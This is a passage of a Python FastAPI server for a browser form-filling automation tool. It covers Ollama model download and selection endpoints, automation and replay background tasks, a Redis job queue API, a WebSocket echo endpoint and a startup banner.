            "percentage": 0,
            "message": "Starting download..."
        }

        # Start download in background
        async def run_download():
            global model_download_progress

            try:
                # Run ollama pull command
                process = subprocess.Popen(
                    ['ollama', 'pull', model_name],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1
                )

                # Monitor progress
                for line in process.stdout:
                    line = line.strip()
                    if line:
                        # Parse progress from ollama output
                        if 'pulling' in line.lower():
                            model_download_progress[model_name]["message"] = line
                        elif '%' in line:
                            # Try to extract percentage
                            try:
                                percent_str = line.split('%')[0].split()[-1]
                                percentage = int(float(percent_str))
                                model_download_progress[model_name]["percentage"] = percentage
                                model_download_progress[model_name]["message"] = line
                            except:
                                model_download_progress[model_name]["message"] = line

                process.wait()

                if process.returncode == 0:
                    model_download_progress[model_name]["status"] = "complete"
                    model_download_progress[model_name]["percentage"] = 100
                    model_download_progress[model_name]["message"] = "Download complete"
                else:
                    model_download_progress[model_name]["status"] = "error"
                    model_download_progress[model_name]["message"] = "Download failed"

            except Exception as e:
                logger.error(f"Model download error: {e}", exc_info=True)
                model_download_progress[model_name]["status"] = "error"
                model_download_progress[model_name]["message"] = str(e)

        background_tasks.add_task(run_download)

        return JSONResponse(content={
            "success": True,
            "message": f"Started downloading {model_name}"
        })

    except Exception as e:
        logger.error(f"Error starting model download: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/ollama/download-progress")
async def get_download_progress(model: str):
    """Get download progress for a specific model"""
    global model_download_progress

    if model not in model_download_progress:
        return JSONResponse(content={
            "status": "not_started",
            "percentage": 0,
            "message": "Download not started"
        })

    return JSONResponse(content=model_download_progress[model])

@app.post("/api/ollama/set-model")
async def set_model(request: Request):
    """Set the active Ollama model in .env"""
    try:
        data = await request.json()
        model_name = data.get("model_name")

        if not model_name:
            raise HTTPException(status_code=400, detail="model_name is required")

        # Check if model is installed
        installer = get_installer()
        status = installer.check_installation()

        if not status["installed"] or not status["running"]:
            raise HTTPException(status_code=400, detail="Ollama is not installed or not running")

        if model_name not in status["models_available"]:
            raise HTTPException(
                status_code=400,
                detail=f"Model {model_name} is not installed. Please download it first."
            )

        # Update .env file
        env_path = Path(".env")
        if env_path.exists():
            # Read current .env
            with open(env_path, 'r') as f:
                env_lines = f.readlines()

            # Update or add OLLAMA_MODEL
            found = False
            for i, line in enumerate(env_lines):
                if line.startswith("OLLAMA_MODEL="):
                    env_lines[i] = f"OLLAMA_MODEL={model_name}\n"
                    found = True
                    break

            if not found:
                env_lines.append(f"\nOLLAMA_MODEL={model_name}\n")

            # Write back
            with open(env_path, 'w') as f:
                f.writelines(env_lines)
        else:
            # Create .env file
            with open(env_path, 'w') as f:
                f.write(f"OLLAMA_MODEL={model_name}\n")

        # Update environment variable in current process
        os.environ["OLLAMA_MODEL"] = model_name

        return JSONResponse(content={
            "success": True,
            "message": f"Active model set to {model_name}"
        })

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error setting model: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/status")
async def get_status():
    """Get server status including update info"""
    status = {
        "status": "running",
        "version": __version__,
        "profiles_count": len(profiles),
        "active_sessions": len(active_sessions),
        "websocket_connections": len(websocket_connections)
    }

    # Add update info if available
    try:
        from tools.auto_updater import updater
        update_status = updater.get_status()
        status["update"] = {
            "available": update_status["update_available"],
            "ready": update_status["update_ready"],
            "latest_version": update_status["latest_version"],
            "pending_version": update_status["pending_version"]
        }
    except Exception:
        status["update"] = {"available": False, "ready": False}

    return JSONResponse(content=status)


# WebSocket endpoint
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket for real-time updates"""
    await websocket.accept()
    websocket_connections.append(websocket)

    try:
        # Send initial connection message
        await websocket.send_json({
            "type": "connected",
            "message": "WebSocket connected"
        })

        # Keep connection alive
        while True:
            data = await websocket.receive_text()
            # Echo back or handle commands
            await websocket.send_json({
                "type": "echo",
                "data": data
            })

    except WebSocketDisconnect:
        if websocket in websocket_connections:
            websocket_connections.remove(websocket)
    except Exception as e:
        # Silently handle websocket errors - they're expected during normal operation
        if websocket in websocket_connections:
            websocket_connections.remove(websocket)

# Add automation runner function
async def run_automation(session_id: str, url: str):
    """Run the automation process"""
    if session_id not in active_sessions:
        return

    automation = active_sessions[session_id]

    try:
        await broadcast_message({
            "type": "automation_started",
            "session_id": session_id,
            "url": url
        })

        # Start browser and navigate
        success = await automation.start(url)

        if success:
            # Detect and fill forms
            fields_filled = await automation.detect_and_fill_forms()

            # Take screenshot
            screenshot = await automation.take_screenshot()

            await broadcast_message({
                "type": "automation_completed",
                "session_id": session_id,
                "fields_filled": fields_filled,
                "screenshot": screenshot
            })
        else:
            await broadcast_message({
                "type": "automation_failed",
                "session_id": session_id,
                "error": "Failed to start browser"
            })

    except Exception as e:
        await broadcast_message({
            "type": "automation_error",
            "session_id": session_id,
            "error": str(e)
        })
    finally:
        # Keep session open for further commands
        pass

@app.post("/api/automation/stop")
async def stop_all_automation():
    """Stop all active automation sessions"""
    stopped_sessions = []

    for session_id in list(active_sessions.keys()):
        try:
            automation = active_sessions[session_id]
            await automation.close()
            del active_sessions[session_id]
            stopped_sessions.append(session_id)
        except Exception:
            # Silently ignore errors when stopping sessions (may already be stopped)
            pass

    if stopped_sessions:
        await broadcast_message({
            "type": "automation_stopped",
            "sessions": stopped_sessions
        })

    return JSONResponse(content={
        "message": "Automation stopped",
        "sessions_stopped": len(stopped_sessions)
    })

@app.post("/api/automation/stop/{session_id}")
async def stop_automation(session_id: str):
    """Stop a specific automation session"""
    if session_id not in active_sessions:
        raise HTTPException(status_code=404, detail="Session not found")

    automation = active_sessions[session_id]
    await automation.close()
    del active_sessions[session_id]

    await broadcast_message({
        "type": "automation_stopped",
        "session_id": session_id
    })

    return JSONResponse(content={"message": "Automation stopped"})

# Background task functions for replay operations

async def run_recording_replay(session_id: str, recording_id: str, profile: dict, session_name: str = None, preview_mode: bool = False):
    """Background task to run recording replay"""
    try:
        replay_engine = active_sessions.get(session_id)
        if not replay_engine:
            await broadcast_message({
                "type": "replay_error",
                "session_id": session_id,
                "error": "Replay engine not found"
            })
            return

        # Run the replay in a thread executor to avoid blocking the event loop
        # This allows async progress callbacks to be delivered in real-time
        import concurrent.futures
        loop = asyncio.get_event_loop()
        with concurrent.futures.ThreadPoolExecutor() as executor:
            results = await loop.run_in_executor(
                executor,
                replay_engine.replay_recording,
                recording_id,
                profile,
                session_name,
                preview_mode
            )

        await broadcast_message({
            "type": "replay_completed",
            "session_id": session_id,
            "data": results
        })

    except Exception as e:
        await broadcast_message({
            "type": "replay_error",
            "session_id": session_id,
            "error": str(e)
        })
    finally:
        # Clean up session
        if session_id in active_sessions:
            del active_sessions[session_id]

async def run_template_replay(session_id: str, template_id: str, profile: dict, session_name: str = None):
    """Background task to run template replay"""
    try:
        replay_engine = active_sessions.get(session_id)
        if not replay_engine:
            await broadcast_message({
                "type": "template_replay_error",
                "session_id": session_id,
                "error": "Replay engine not found"
            })
            return

        # Run the template replay
        results = replay_engine.replay_template(template_id, profile, session_name)

        await broadcast_message({
            "type": "template_replay_completed",
            "session_id": session_id,
            "data": results
        })

    except Exception as e:
        await broadcast_message({
            "type": "template_replay_error",
            "session_id": session_id,
            "error": str(e)
        })
    finally:
        # Clean up session
        if session_id in active_sessions:
            del active_sessions[session_id]

# Static file serving (works in both dev and PyInstaller bundle)
app.mount("/static", StaticFiles(directory=str(BASE_PATH / "static")), name="static")
app.mount("/web", StaticFiles(directory=str(BASE_PATH / "web")), name="web")

def show_startup_animation():
    """Display cool startup animation with Gemini-style typewriter effect"""
    import time
    from colorama import Fore, Style, init
    init()

    def typewriter(text, delay=0.02, color="", end="\n"):
        """Print text with typewriter effect like Gemini CLI"""
        for char in text:
            print(f"{color}{char}{Style.RESET_ALL}", end='', flush=True)
            time.sleep(delay)
        print(end=end)

    # Clear screen (cross-platform)
    system = platform.system()
    clear_cmd = "clear" if system == "Linux" else "cls"
    os.system(clear_cmd)

    # Large KPR ASCII art banner
    kpr_banner = """
██╗  ██╗██████╗ ██████╗
██║ ██╔╝██╔══██╗██╔══██╗
█████╔╝ ██████╔╝██████╔╝
██╔═██╗ ██╔═══╝ ██╔══██╗
██║  ██╗██║     ██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝
"""

    for line in kpr_banner.strip().split('\n'):
        typewriter(line, 0.005, Fore.CYAN)

    print()
    typewriter("Browser Automation Platform", 0.015, Fore.CYAN)
    print()

    # Loading steps with typewriter effect and faster delays
    steps = [
        ("Initializing browser engine", 0.1),
        ("Loading automation modules", 0.08),
        ("Preparing AI field mapper", 0.08),
        ("Starting web server", 0.12),
        ("Configuring network", 0.08),
        ("Establishing secure connections", 0.08),
        ("Ready to launch", 0.1)
    ]

    for step, delay in steps:
        typewriter(f"▶ {step}...", 0.015, Fore.GREEN, end='')
        time.sleep(delay)
        print(f" {Fore.GREEN}✓{Style.RESET_ALL}")

    print()
    typewriter("━" * 54, 0.005, Fore.CYAN)
    typewriter("✓ Server running on http://localhost:5511", 0.02, Fore.GREEN)
    typewriter("⚠ Close this window to stop FormAI", 0.02, Fore.YELLOW)
    typewriter("━" * 54, 0.005, Fore.CYAN)
    print()

# ==================== Job Queue API ====================
# These endpoints are for the Docker-based job queue system

try:
    from queue_manager import get_queue_manager
    from job_models import Job, JobSubmitRequest, JobStats
    REDIS_ENABLED = True
except ImportError:
    REDIS_ENABLED = False
    # Define dummy classes if imports fail
    class JobSubmitRequest(BaseModel):
        profile_id: str
        recording_id: str
        count: int = 1

@app.get("/api/jobs/stats")
async def get_job_stats():
    """Get job queue statistics"""
    if not REDIS_ENABLED:
        return JSONResponse(content={"error": "Redis not configured"}, status_code=503)
    try:
        queue = get_queue_manager()
        if not queue.is_connected():
            return JSONResponse(content={"error": "Redis not connected"}, status_code=503)
        stats = queue.get_stats()
        return stats.model_dump()
    except Exception as e:
        return JSONResponse(content={"error": str(e)}, status_code=500)

@app.get("/api/jobs/workers")
async def get_workers():
    """Get list of active workers"""
    if not REDIS_ENABLED:
        return JSONResponse(content=[], status_code=200)
    try:
        queue = get_queue_manager()
        workers = queue.get_workers()
        return workers
    except Exception as e:
        return JSONResponse(content={"error": str(e)}, status_code=500)

@app.get("/api/jobs/recent")
async def get_recent_jobs():
    """Get recent jobs (completed + failed)"""
    if not REDIS_ENABLED:
        return JSONResponse(content=[], status_code=200)
    try:
        queue = get_queue_manager()
        jobs = queue.get_recent_jobs(limit=50)
        return jobs
    except Exception as e:
        return JSONResponse(content={"error": str(e)}, status_code=500)

@app.get("/api/jobs/{job_id}")
async def get_job_details(job_id: str):
    """Get details for a specific job"""
    if not REDIS_ENABLED:
        raise HTTPException(status_code=503, detail="Redis not configured")
    try:
        queue = get_queue_manager()
        details = queue.get_job_details(job_id)
        if not details:
            raise HTTPException(status_code=404, detail="Job not found")
        return details
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/jobs")
async def submit_job(request: JobSubmitRequest):
    """Submit one or more jobs to the queue"""
    if not REDIS_ENABLED:
        raise HTTPException(status_code=503, detail="Redis not configured")
    try:
        queue = get_queue_manager()
        if not queue.is_connected():
            raise HTTPException(status_code=503, detail="Redis not connected")

        job_ids = []
        for _ in range(request.count):
            job = Job(
                profile_id=request.profile_id,
                recording_id=request.recording_id,
                target_url=request.target_url
            )
            job_id = queue.add_job(job)
            job_ids.append(job_id)

        return {"success": True, "job_ids": job_ids, "count": len(job_ids)}
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Route for jobs dashboard page
@app.get("/jobs")
async def jobs_page():
    """Serve the jobs dashboard page"""
    return FileResponse("web/jobs.html")

MODE = os.getenv("MODE", "web")

if __name__ == "__main__":
    if MODE == "worker":
        from worker import main as worker_main
        print("Running in worker mode")
        asyncio.run(worker_main())
    else:
        import webbrowser
        import threading
        import time

        # Skip startup animation when launched from test.bat
        # show_startup_animation()

        print("\nServer starting on http://localhost:5511")
        print("Close this window to stop FormAI\n")

        def open_browser():
            """Open browser after a short delay"""
            time.sleep(1)  # Short delay for server to start
            try:
                webbrowser.open("http://localhost:5511")
            except:
                pass  # Silently fail if browser can't open

        # Start browser in background thread
        threading.Thread(target=open_browser, daemon=True).start()

        # Run the server (when terminal closes, this exits and server stops)
        uvicorn.run(
            app,
            host="0.0.0.0",
            port=5511,
            log_level="info"
        )
